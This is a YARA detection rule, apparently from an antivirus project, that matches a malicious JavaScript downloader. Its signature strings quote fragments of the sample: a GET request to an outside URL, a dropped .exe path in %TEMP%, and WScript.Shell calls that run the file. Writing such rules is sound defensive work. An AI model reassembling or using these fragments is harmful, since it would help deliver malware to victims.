rule sig_20160328_7b46171b20abac8ae521058e1a00b7fc {
  meta:
    description = "datamaliciousorder - file 20160328_7b46171b20abac8ae521058e1a00b7fc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1e5f61022168ae01ce07ae253330d5640a3e0d144ffc789ef44ecd0c40802cfb"

  strings:
    $s1  = "function Ruuji() {return Lpecsv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"BaosDctpf4VG85zz.exe\";};" fullword ascii
    $s2  = "Iebicivun[Onqlm](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Ikonv](Sgyjom() * 11)} while (Iebicivun[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Lpecsv = function Hkmhe() {return WScript[Ozrwrxlyr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Yuoishgz(Temdyapm, Ltcbefppln){return Temdyapm - Ltcbefppln;};" fullword ascii
    $s6  = "function Vhtcrpz() {return ((Kdwocbahsw == true) && (Kdwocbahsw == Yqvtlo)) ? 1 : Rsxpogzyae;};" fullword ascii
    $s7  = "function Akzxdq(Majsjwx){Lpecsv[\"Run\"](Majsjwx, Rsxpogzyae, Rsxpogzyae);};" fullword ascii
    $s8  = "var Kdwocbahsw = false;" fullword ascii
    $s9  = "Kdwocbahsw = true; " fullword ascii
    $s10 = "return Yuoishgz(Uenyn, Ncjrxmmvsd);" fullword ascii
    $s11 = "var Yqvtlo = false;" fullword ascii
    $s12 = "function Bjhqdvmi(){return Ozrwrxlyr;};" fullword ascii
    $s13 = "var Ynuybef = false;" fullword ascii
    $s14 = "Yqvtlo = true; " fullword ascii
    $s15 = "function Sgyjom(){return 22;};" fullword ascii
    $s16 = " while (Jezuym){" fullword ascii
    $s17 = "var Hfpsjbtbss = new this[\"Date\"]();" fullword ascii
    $s18 = "function Ljjfybe(Snkvd) {var Mxhiwzt = (1, 2, 3, 4, 5, Snkvd); return Mxhiwzt;};" fullword ascii
    $s19 = "function Mieaqmq()" fullword ascii
    $s20 = "function Cljasqcth(){return Kclpzxvgx;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}